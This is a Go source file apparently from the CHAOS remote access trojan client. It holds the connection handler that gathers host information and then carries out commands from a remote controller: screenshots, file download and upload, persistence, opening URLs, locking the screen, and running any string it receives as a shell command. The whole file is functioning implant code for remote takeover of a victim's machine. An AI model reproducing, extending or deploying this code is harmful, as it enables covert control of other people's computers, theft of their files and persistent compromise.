package connection

import (
	log "github.com/sirupsen/logrus"
	"github.com/tiagorlampert/CHAOS/client/app/handler"
	"github.com/tiagorlampert/CHAOS/client/app/usecase"
	"github.com/tiagorlampert/CHAOS/client/app/util/network"
	"io"
	"net"
	"strings"
)

type ConnectionHandler struct {
	Connection net.Conn
	UseCase    *usecase.UseCase
}

func NewConnectionHandler(conn net.Conn, useCase *usecase.UseCase) handler.Handler {
	return &ConnectionHandler{
		Connection: conn,
		UseCase:    useCase,
	}
}

func (c ConnectionHandler) Handle() error {
	c.UseCase.Information.Collect()

	for {
		message, err := network.Read(c.Connection)
		if err != nil {
			switch err {
			case io.EOF:
				log.Warnln("client closed the connection by terminating the process")
			default:
				log.WithField("cause", err.Error()).Error("error reading from connection")
			}
			break
		}

		switch strings.TrimSpace(message.Command) {
		case "information":
			c.UseCase.Information.Collect()
		case "screenshot":
			c.UseCase.Screenshot.TakeScreenshot()
		case "download":
			c.UseCase.Download.File(message.Data)
		case "upload":
			c.UseCase.Upload.File(message.Data)
		case "persistence":
			c.UseCase.Persistence.Persist(message.Data)
		case "open-url":
			c.UseCase.OpenURL.Open(string(message.Data))
		case "lockscreen":
			c.UseCase.LockScreen.Lock()
		default:
			c.UseCase.Terminal.Run(string(message.Data))
		}
	}
	return nil
}
